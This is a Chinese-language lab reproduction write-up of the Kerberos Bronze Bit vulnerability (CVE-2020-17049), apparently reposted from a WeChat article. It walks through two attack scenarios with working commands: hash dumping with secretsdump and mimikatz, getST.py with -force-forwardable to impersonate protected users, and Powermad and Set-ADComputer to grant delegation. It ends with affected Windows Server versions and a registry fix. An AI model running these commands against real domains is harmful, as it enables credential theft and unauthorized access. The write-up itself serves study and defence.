> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/By1Vjm-t4CxjUaTEV_ykVg)

**写在前面，文章为复现文章，不涉及原理，有兴趣者可自行研究。**  

首先简单说明一下这个漏洞的作用，直接扳原文：

```
An attacker can impersonate users which are not allowed to be delegated. This includes members of the Protected Users group and any other users explicitly configured as “sensitive and cannot be delegated.”
An attacker can launch the attack from a service which is not allowed to perform the authentication protocol transition. This means that if the service is configured without the “TrustedToAuthForDelegation” property (shown as “Trust this user for delegation to specified services only – Use Kerberos only” in the AD GUI), the attacker can use the exploit to obtain tickets as if the “TrustedToAuthForDelegation” property were set (shown as “Trust this user for delegation to specified services only – Use any authentication protocol” in the AD GUI).
```

大体意思就是这个漏洞可以让攻击者去攻击 “受保护组“、或设置了“敏感用户，禁止委派” 的用户。或者去攻击设置了 “仅信任该计算机来委派指定的服务 --> 仅使用 kerberos”的机器。

大体的攻击思路如下：

1、攻击者已经获取了域内的某台机器的权限。

2、拥有域内服务的 hash，称为 service1。hash 可以通过 DC Sync attacks, Kerberoasting，甚至是用 Powermad 来注册 spn 的方式来获得。

3、service1 对域内的其他服务拥有约束委派关系。其配置可能如下（1）service2 在 service1 的 AllowedToDelegateTo 列表当中。（2）service1 在 service2 的 PrincipalsAllowedToDelegateToAccount 列表当中，且攻击者对 service2 有 GenericAll, GenericWrite, WriteOwner, etc 权限。

4、攻击者利用该漏洞去获取到 service2 的 kerberos 票据

5、攻击者利用票据去攻击 service2

漏洞原理：

在之前的利用方法中，假如我们已经拥有了一个 service1 的 hash，想要去获取 service2 的权限时，便可以使用 getST.py 程序执行 S4U 交换，来获取目标的 TGT，如果其配置了 "TrustedToAuthForDelegation"，且用户未受保护的话，其流程如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCLBzOO0VXcRsnItu0HdmwL1icOzibs8O9mAZhJkVNQD6uamIKKV7bOqvQ/640?wx_fmt=png)

但如果其设置了仅 kerberos 或者受保护的组的话，则不会成功。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCYRRkUzdQl8ibsE4Fn3lPibkWtOV64A2QBU1yUFWG3YhtSW7nVgDRnnug/640?wx_fmt=png)

而漏洞作者为工具增加了 - force-forwardable 参数，使其成为了可能。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnC8WoTbZRrtZQ7EnjaRlhARb0QbeLBLUQibGuibGf72I0mibiaAoHAGVcwng/640?wx_fmt=png)

这个 gif 很直观的显示了该过程：https://blog.netspi.com/wp-content/uploads/2020/10/bit_flip_animation_cropped.gif  

**漏洞复现**  

网络拓扑环境如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnC0zfoUa7gDN6xwY6TR5fGeWAnUFS0mx9Cgia8FAWPN5bqPwCe1CpFEHQ/640?wx_fmt=png)

Example Attack1：

环境配置如下：

server1 设置如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCjnkbHnq5Ndr0friaHgzYt1OBb3KRpLhyM3X5NqeDauEZXiaVybzPEwHg/640?wx_fmt=png)

user2 设置：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCKKM34q1U5EC1p9quwznawWhpOxS4epWocQQp353xDSY9XOXgRVCB7g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCxq6OSdsHicBhU2ShvuT50Ne5ZkkvZ6Aq3DJhPiaibWJhxuFI09Tf0OQsw/640?wx_fmt=png)

开始攻击：

首先访问 server2, 确认无法直接连接到 server。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCialwsALZ5D9F6KDicnmmhZGWhBSegSYIbperawAJjXW0G7v1ibZkbIX2w/640?wx_fmt=png)

然后我们需要获取 server1 的机器账户的 AES256-CTS-HMAC-SHA1-96 和 LM:NTLM hash ，在作者的复现过程中使用的是 secretsdump.py 来操作的，也就是下面这样：

```
python .\impacket\examples\secretsdump.py 'test/user1:<user1_password>@Service1.test.local'
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCMclsnrDthSGHwk5OgyA1T8PTUiaJmufbMq2ATaPyHRrI8uXppYLelCA/640?wx_fmt=png)

但笔者在测试过程中，发现并不可以这样操作。也有可能是我操作有问题.. 于是我换成了 mimikatz 的 ekeys 来操作：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCBxEnMV288ejfdPO7BfHpKVLXO6RKlOTicUKd4aZwMvBVqyuBfnzL9vg/640?wx_fmt=png)

或者为了复现方便，提升到高权限操作：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCph3A3rCkUHTaaXk6f9VOmU3ib7VYnvN06bUSfiaevh54VZrrsL6Fvcjg/640?wx_fmt=png)

```
.\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes <LM:NTLM hash> -aesKey <AES hash> test.local/Service1
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCWlWZJXeE9NXrTwXUFRibOUkLksAUXibSDuZ2tHNWSWKu4uFuldCwk2Qg/640?wx_fmt=png)

发现，并不能获取 user2 的 TGT，而加上参数之后，则可以成功获取

```
.\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes <LM:NTLM hash> -aesKey <AES hash> test.local/Service1 -force-forwardable
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCEnzM9UJ2YV5A05SEXyCuBdR4lA5n6IuM54XM5TkM4F1aeBI2HmvRbA/640?wx_fmt=png)

然后我们注入该票据：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnChlQPZqPqJjiboCqxS25FxqIibyIzic74aOydn4QC4PehgXic31lsD7DW8A/640?wx_fmt=png)

不过我们这里的是 host 的票据，我们一般需要的是 cifs，按照刚才的步骤再走一遍就 ok 了。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnChFG3enKXwbVXicEpibouptOIgMFeO9cV5yg59GMiaLLmYWK170g4MwVww/640?wx_fmt=png)

此时便拥有了对目标的访问权限。

Example Attack2：

环境配置如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnC38ic48jB9XbjjXVK6k0MeJ4Q4xaJrUYNhSrVIyR5USbMP4qcAYre1og/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCgg7SCXdNAsbCnY1x0MtYsHmOaKw5quYlncC45rYNrEhEVR7kjzhqJA/640?wx_fmt=png)

开始攻击：

```
Import-Module .\Powermad\powermad.ps1
New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCgngcUhaezJf1VFODjbKgcoleLB443QUm5ib8EcSY0v5637S6yqMTPAw/640?wx_fmt=png)

然后：

```
"kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCOYxKOC0YesibTib1zlQiboqGe9Z7XS0DAugPfkziaHm37QHHEOvuyONkyA/640?wx_fmt=png)

然后

```
Install-WindowsFeature RSAT-AD-PowerShell
Import-Module ActiveDirectory
Get-ADComputer AttackerService
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnC3RoqNcL03xIQibXt3BWAC2WInlZG6WEibhvzsybskm3gA8UkwmA4FRUg/640?wx_fmt=png)

然后：

```
Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCBNTwPBVKXglGmQE0JjibcJp22FAstL5SGkb835w7DS1HbCRffubKOZg/640?wx_fmt=png)

然后获取 TGT

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCx82Mto9ibAo1StQBAK2sqwTRowZibVQic8ylD6oPNkgt7cQjbH96fAVXw/640?wx_fmt=png)

然后注入票据即可.

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnCSwibRNibicmMudQfvHc59ibozaT4ZUoWE7Pol90NJrVogLIpoyo5IMWcIw/640?wx_fmt=png)

**写在后面**  

由于时间问题，并未对原理进行研究，只是简单进行了复现，有兴趣者可自行抓包分析。

漏洞影响版本

*   Windows Server 2012
    
*   Windows Server 2012 R2
    
*   Windows Server 2016
    
*   Windows Server 2019
    
*   Windows Server, version 1903
    
*   Windows Server, version 1909
    
*   Windows Server, version 2004
    
*   Windows Server, version 20H2
    

修复方案：  

将 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Kdc 的 PerformTicketSignature 设置为 1

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WYqiacm1PKxEiateOicJKZRnC6N1A75mGeYZE8QyibHhuibvWicEX6Y3JqLH5ynFJFwGpib7lk9x6yDekibw/640?wx_fmt=png)

参考文章：

https://www.zdnet.com/article/windows-10-update-problem-were-fixing-kerberos-authentication-bug-says-microsoft/

https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/

https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-overview/

https://github.com/SecureAuthCorp/impacket/pull/1013

https://dirteam.com/sander/2020/11/11/kerberos-security-feature-bypass-vulnerability-important-cve-2020-17049-cvssv3-6-6/